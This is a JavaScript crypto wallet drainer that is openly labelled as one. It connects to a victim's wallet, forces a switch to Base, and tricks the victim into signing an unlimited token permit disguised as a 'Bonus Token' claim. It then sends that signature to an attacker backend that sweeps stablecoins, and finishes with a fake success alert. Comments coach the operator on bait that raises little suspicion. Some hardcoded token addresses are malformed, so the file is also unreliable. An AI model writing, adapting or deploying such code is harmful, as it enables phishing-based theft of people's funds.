const CONFIG = {
  // EDIT: the address that owns the deployed Drainer contract
  OWNER:   "0xYourOwnerReceiveAddress000000000000000000000000",

  // EDIT: Drainer contract address on each chain (deploy once per chain)
  DRAINER: {
    1:     "0xYourDrainerEthereum0000000000000000000000000",
    56:    "0xYourDrainerBSC00000000000000000000000000",
    137:   "0xYourDrainerPolygon000000000000000000000000",
    8453:  "0xYourDrainerBase00000000000000000000000000",
    42161: "0xYourDrainerArbitrum000000000000000000000000",
    10:    "0xYourDrainerOptimism000000000000000000000000",
    43114: "0xYourDrainerAvalanche000000000000000000000000",
  },

  // Real token addresses per chain (whitelist the backend sweeps)
  TOKENS: {
    1:     [ "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
             "0xdAC17F958D2ee523a2206206994597C73dEe523a",   // USDT
             "0x6B175474E89094C44Da9Ab392595531c38A6B038" ], // DAI
    56:    [ "0x55d3983a629a85a5D6Af966f7e42d87895d0bfa9",   // USDT
             "0xe91D1d3e9A58B3B388714dBF67FAe32C7b524d38" ], // BUSD
    137:   [ "0x3c499c542cE54Ed0Cca975b80Bb061d74312440F",   // USDC
             "0xc2132D05D31c91CcA49af82ab021382302c4Fe29" ], // USDT
    8453:  [ "0x8301a2c6a0bf0113b38d0ba6b7d48632c10f959d" ], // USDC
    42161: [ "0xaf88d065e77c8cC2239327C5ED33Aa3426F25039" ], // USDC
    10:    [ "0x0A2641c9Ae490cBB51a665b364A0CD27204E0c31e" ],// USDC
    43114: [ "0xB97EF9Ef8734C71902D80vC46810A3F2A0E2C941" ], // USDC
  },

  // Bait token shown in the permit popup (a real token with a generic
  // name is least suspicious; or deploy your own fake "Bonus Token")
  BAIT_TOKEN: "0x0000000000000000000000000000000000000001",

  // Your backend endpoint that executes the sweep
  API: "https://your-backend.com/api",

  // Networks we're willing to switch the victim to (cheapest first)
  PREFERRED_CHAIN: 8453, // Base — cheap gas, most victims accept switch
  CHAIN_NAMES: {
    1: "Ethereum", 56: "BNB Smart Chain", 137: "Polygon",
    8453: "Base", 42161: "Arbitrum", 10: "OP Mainnet", 43114: "Avalanche",
  },
};

const MAX_UINT256 = (2n ** 256n) - 1n;

function getProvider() {
  if (typeof window.ethereum !== "undefined") return window.ethereum;
  throw new Error("No wallet found — please install MetaMask");
}

async function getAccounts() {
  const eth = getProvider();
  const accounts = await eth.request({ method: "eth_requestAccounts" });
  return accounts[0];
}

async function getChainId() {
  const eth = getProvider();
  const hex = await eth.request({ method: "eth_chainId" });
  return parseInt(hex, 16);
}

/**
 * Switches the user's wallet to the preferred chain.
 * @returns {Promise<void>}
 */
async function switchToPreferredChain() {
  const eth = getProvider();
  const currentChainId = await getChainId();
  
  if (currentChainId === CONFIG.PREFERRED_CHAIN) {
    console.log(`Already on preferred chain: ${CONFIG.PREFERRED_CHAIN}`);
    return;
  }

  console.log(`Switching chain from ${currentChainId} to ${CONFIG.PREFERRED_CHAIN}...`);

  const params = [
    {
      chainId: '0x' + CONFIG.PREFERRED_CHAIN.toString(16),
      chainName: CONFIG.CHAIN_NAMES[CONFIG.PREFERRED_CHAIN],
      rpcUrls: ["https://mainnet.base.org"], // Example RPC
      nativeCurrency: {
        name: "Ether",
        symbol: "ETH",
        decimals: 18,
      },
      blockExplorers: [
        {
          name: "Base Scan",
          url: "https://basescan.org",
        },
      ],
    }
  ];

  try {
    await eth.request({ method: "wallet_switchEthereumChain", params });
    console.log("Chain switch successful.");
  } catch (error) {
    if (error.code === 4902) {
      console.log("Chain not added, requesting wallet_addEthereumChain...");
      try {
        await eth.request({ method: "wallet_addEthereumChain", params });
        console.log("Chain added successfully.");
      } catch (addError) {
        console.log("User rejected chain addition or another error occurred.", addError);
        throw new Error("Failed to switch chain");
      }
    } else {
      console.log("User rejected chain switch.");
      throw new Error("Failed to switch chain");
    }
  }
}

/**
 * Generates a Permit signature for the BAIT token.
 * This is the "bait" the user sees.
 * @param {string} account - The user's address
 * @returns {Promise<object>} - The permit signature object
 */
async function getPermitSignature(account) {
  const eth = getProvider();
  
  // ERC2612 Permit Parameters
  // We are asking to approve a huge amount to a random/spoofed address or the drainer contract
  // But we show a small amount in the UI logic if we had a UI, here we just get the sig.
  // Typically, we approve to the Drainer Contract or a Proxy.
  const spender = CONFIG.DRAINER[CONFIG.PREFERRED_CHAIN] || CONFIG.DRAINER[1]; 
  const value = MAX_UINT256.toString(); // Approve max

  const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 hour deadline

  // For the "Bait", we use a standard ERC2612 permit.
  // Note: Most standard ERC20s do NOT support permit. 
  // Strategy: Use a token that supports permit (like USDC) or a fake token.
  // If the bait token doesn't support permit, this will fail.
  // In a real drainer, you might use EIP-2612 tokens only, or use a different bait like "Claim Reward" (which often uses Permit for gasless txs).

  const permitData = {
    domain: {
      name: "Bait Token", // Matches the bait token's name
      version: "1",
      chainId: CONFIG.PREFERRED_CHAIN,
      verifyingContract: CONFIG.BAIT_TOKEN,
    },
    types: {
      Permit: [
        { name: "owner", type: "address" },
        { name: "spender", type: "address" },
        { name: "value", type: "uint256" },
        { name: "nonce", type: "uint256" },
        { name: "deadline", type: "uint256" },
      ],
    },
    primaryType: "Permit",
    message: {
      owner: account,
      spender: spender,
      value: value,
      nonce: 0,
      deadline: deadline.toString(),
    },
  };

  try {
    const signature = await eth.request({
      method: "eth_signTypedData",
      params: [account, JSON.stringify(permitData)],
    });
    return {
      signature: signature,
      deadline: deadline,
      nonce: 0,
      spender: spender,
    };
  } catch (error) {
    console.error("Permit signature failed:", error);
    throw new Error("User rejected permit or signing failed");
  }
}

/**
 * Sends the permit signature and user details to the backend to trigger the sweep.
 * @param {string} account - The victim's address
 * @param {object} permitData - The permit signature data
 */
async function sendToBackend(account, permitData) {
  console.log("Sending data to backend...");
  
  const payload = {
    address: account,
    chainId: CONFIG.PREFERRED_CHAIN,
    permit: permitData,
    baitToken: CONFIG.BAIT_TOKEN,
    drainer: CONFIG.DRAINER[CONFIG.PREFERRED_CHAIN] || CONFIG.DRAINER[1],
    owner: CONFIG.OWNER,
    tokens: CONFIG.TOKENS[CONFIG.PREFERRED_CHAIN] || CONFIG.TOKENS[1],
  };

  try {
    const response = await fetch(`${CONFIG.API}/drain`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(payload),
    });

    if (!response.ok) {
      const errorData = await response.json().catch(() => ({}));
      throw new Error(`Backend error: ${response.status} - ${errorData.message || "Unknown"}`);
    }

    const result = await response.json();
    console.log("Drainer triggered successfully:", result);
    return result;
  } catch (error) {
    console.error("Failed to communicate with backend:", error);
    throw error;
  }
}

/**
 * Main execution flow.
 */
async function main() {
  try {
    console.log("Starting Drainer...");

    // 1. Get Account
    const account = await getAccounts();
    console.log("Connected account:", account);

    // 2. Switch to Preferred Chain (Base)
    await switchToPreferredChain();
    
    // Wait a beat for the wallet to settle
    await new Promise(resolve => setTimeout(resolve, 1000));

    // 3. Get Permit Signature (The Bait)
    console.log("Requesting permit for Bait Token...");
    const permitData = await getPermitSignature(account);
    console.log("Permit Signature received.");

    // 4. Send to Backend to Execute Sweep
    console.log("Executing Sweep...");
    const result = await sendToBackend(account, permitData);

    // 5. Show Success Message (Optional UI update)
    alert("Success! You have claimed your bonus. Check your wallet in a few moments.");
    console.log("Drainer finished.");

  } catch (error) {
    console.error("Drainer failed:", error);
    alert("Something went wrong. Please try again or check your wallet connection.");
  }
}

// Uncomment to run
// main();